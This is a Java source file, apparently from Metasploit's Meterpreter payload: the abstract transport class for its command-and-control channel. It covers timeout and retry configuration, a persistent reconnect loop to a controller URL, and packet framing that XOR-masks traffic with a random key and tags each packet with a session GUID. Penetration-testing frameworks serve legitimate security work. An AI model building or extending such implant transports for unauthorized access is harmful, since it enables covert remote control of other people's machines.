package com.metasploit.meterpreter;

import com.metasploit.stage.ConfigParser;

import java.io.ByteArrayInputStream;
import java.io.DataInputStream;
import java.io.DataOutputStream;
import java.io.OutputStream;
import java.io.IOException;

public abstract class Transport {
    public static final long MS = 1000L;
    public static final int ENC_NONE = 0;

    private Transport prev;
    private Transport next;
    private Meterpreter meterpreter;

    protected String url;
    protected long commTimeout;
    protected long retryTotal;
    protected long retryWait;

    protected abstract boolean tryConnect(Meterpreter met) throws IOException;

    public abstract int parseConfig(byte[] configuration, int offset);
    public abstract void bind(DataInputStream in, OutputStream rawOut);
    public abstract void disconnect();
    public abstract boolean dispatch(Meterpreter met);
    public abstract void writePacket(TLVPacket packet, int type) throws IOException;
    public abstract TLVPacket readPacket() throws IOException;
    public abstract boolean switchUri(String uri);

    protected Transport(Meterpreter met, String url) {
        this.meterpreter = met;
        this.url = url;
    }

    protected int parseTimeouts(byte[] configuration, int offset) {
        // starts with the comms timeout
        this.commTimeout = MS * ConfigParser.unpack32(configuration, offset);
        offset += 4;

        // then we have the retry total
        this.retryTotal = MS * ConfigParser.unpack32(configuration, offset);
        offset += 4;

        // then we have the retry wait
        this.retryWait = MS * ConfigParser.unpack32(configuration, offset);
        offset += 4;

        return offset;
    }

    protected void arrayCopy(byte[] src, int srcOffset, byte[] dest, int destOffset, int count) {
        for (int i = 0; i < count; ++i) {
            dest[destOffset + i] = src[srcOffset + i];
        }
    }

    protected void writeInt(byte[] dest, int offset, int value) {
        dest[offset] = (byte)((value >> 24) & 0xFF);
        dest[offset + 1] = (byte)((value >> 16) & 0xFF);
        dest[offset + 2] = (byte)((value >> 8) & 0xFF);
        dest[offset + 3] = (byte)(value & 0xFF);
    }

    protected int readInt(byte[] source, int offset) {
        return (0xFF & source[offset]) << 24 |
          (0xFF & source[1 + offset]) << 16 |
          (0xFF & source[2 + offset]) << 8 |
          (0xFF & source[3 + offset]);
    }

    protected TLVPacket readAndDecodePacket(DataInputStream in) throws IOException {
        byte[] header = new byte[32];
        in.readFully(header);
        byte[] clonedHeader = header.clone();

        byte[] xorKey = new byte[4];
        this.arrayCopy(header, 0, xorKey, 0, 4);

        // XOR the whole header first
        this.xorBytes(xorKey, header);

        // extract the length
        int bodyLen = this.readInt(header, 24) - 8;

        byte[] body = new byte[bodyLen];
        in.readFully(body);

        // TODO: add decryption support here.

        // create a complete packet and xor the whole thing. We do this becauase we can't
        // be sure that the content of the body is 4-byte aligned with the xor key, so we
        // do the whole lot to make sure it behaves
        byte[] packet = new byte[clonedHeader.length + body.length];
        this.arrayCopy(clonedHeader, 0, packet, 0, clonedHeader.length);
        this.arrayCopy(body, 0, packet, clonedHeader.length, body.length);
        this.xorBytes(xorKey, packet);

        // Skip the packet TLV header and move straight the first TLV header (by jumping over header.length bytes)
        ByteArrayInputStream byteStream = new ByteArrayInputStream(packet, clonedHeader.length, body.length);
        DataInputStream inputStream = new DataInputStream(byteStream);
        TLVPacket tlvPacket = new TLVPacket(inputStream, body.length);
        inputStream.close();

        return tlvPacket;
    }

    protected void encodePacketAndWrite(TLVPacket tlvPacket, int type, DataOutputStream out) throws IOException {
        byte[] data = tlvPacket.toByteArray();
        byte[] packet = new byte[32 + data.length];
        randXorKey(packet, 0);

        // TODO: add encryption support here

        // Include the session guid in the outgoing message
        byte[] sessionGUID = this.meterpreter.getSessionGUID();
        this.arrayCopy(sessionGUID, 0, packet, 4, sessionGUID.length);

        // We don't currently support encryption
        this.writeInt(packet, 20, ENC_NONE);

        // Write the length/type
        this.writeInt(packet, 24, data.length + 8);
        this.writeInt(packet, 28, type);

        // finally write the data
        this.arrayCopy(data, 0, packet, 32, data.length);

        // Xor the packet bytes
        this.xorBytes(packet, packet, 4);

        // send it!
        synchronized (out) {
            out.write(packet);
            out.flush();
        }
    }

    private void randXorKey(byte[] dest, int offset) {
      dest[offset] = randByte();
      dest[offset + 1] = randByte();
      dest[offset + 2] = randByte();
      dest[offset + 3] = randByte();
    }

    private byte randByte() {
        // Forces a random number between 1 and 255 _inclusive_
        return (byte)(0xFF & (int)((Math.random() * 255) + 1));
    }

    private void xorBytes(byte[] xorKey, byte[] bytes) {
        this.xorBytes(xorKey, bytes, 0);
    }

    private void xorBytes(byte[] xorKey, byte[] bytes, int offset) {
        for (int i = 0; i < bytes.length - offset; ++i) {
            bytes[i + offset] ^= xorKey[i % 4];
        }
    }

    public String getUrl() {
        return this.url;
    }

    public long getCommTimeout() {
        return this.commTimeout / MS;
    }

    public void setCommTimeout(long commTimeout) {
        this.commTimeout = commTimeout * MS;
    }

    public long getRetryTotal() {
        return this.retryTotal / MS;
    }

    public void setRetryTotal(long retryTotal) {
        this.retryTotal = retryTotal * MS;
    }

    public long getRetryWait() {
        return this.retryWait / MS;
    }

    public void setRetryWait(long retryWait) {
        this.retryWait = retryWait * MS;
    }

    public boolean connect(Meterpreter met) {
        long lastAttempt = System.currentTimeMillis();

        while (System.currentTimeMillis() < lastAttempt + this.retryTotal) {
            try {
                if (this.tryConnect(met)) {
                    return true;
                }
            } catch (Exception e) {
            }

            met.sleep(this.retryWait);
        }

        return false;
    }

    public void setPrev(Transport t) {
        this.prev = t;
    }

    public void setNext(Transport t) {
        this.next = t;
    }

    public Transport getPrev() {
        return this.prev;
    }

    public Transport getNext() {
        return this.next;
    }
}

